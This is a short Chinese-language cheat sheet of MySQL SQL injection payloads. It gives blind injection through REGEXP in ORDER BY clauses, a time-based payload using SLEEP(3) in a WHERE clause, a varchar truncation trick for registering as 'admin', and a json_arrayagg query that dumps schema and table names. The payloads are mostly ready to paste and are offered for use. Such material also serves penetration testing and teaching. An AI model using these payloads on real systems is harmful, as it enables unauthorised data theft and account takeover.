使用二进制查询和 REGEXP 在 ORDER BY 子句中进行 MySQL 盲 SQL 注入​

这个查询基本上按一列或另一列排序，这取决于 EXISTS（）是否返回 1. 为了让 EXISTS（）函数返回 1，REGEXP 查询需要匹配，这意味着您可以逐个字符地伪造盲值，并在没有直接输出的情况下从数据库泄漏数据。

[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -

MySQL 盲 SQL 注入二进制查询使用 REGEXP。​

有效载荷：

' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -

将在查询中工作（其中“where”子句是注入点）：

SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -';

在上述查询中，它将检查“项目”数据库中以“a”开头的“名称”列中是否存在项目。如果它能为每个项目睡眠 3 秒。

MYSQL 截断​

在 MYSQL 中，“ admin ”和“ admin”是相同的。如果数据库中的 username 列有字符限制，则会截断其余字符。因此，如果数据库的列限制为 20 个字符，并且我们输入了一个包含 21 个字符的字符串，则最后 1 个字符将被删除。

`username` varchar(20) not null

有效载荷： username = "admin a"

MYSQL 快速利用​

要求： MySQL >= 5.7.22

使用 json_arrayagg() 而不是，这样可以显示更少的符号

  • group_concat（）=1024 个符号
  • json_arrayagg（）>16000000 个符号
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
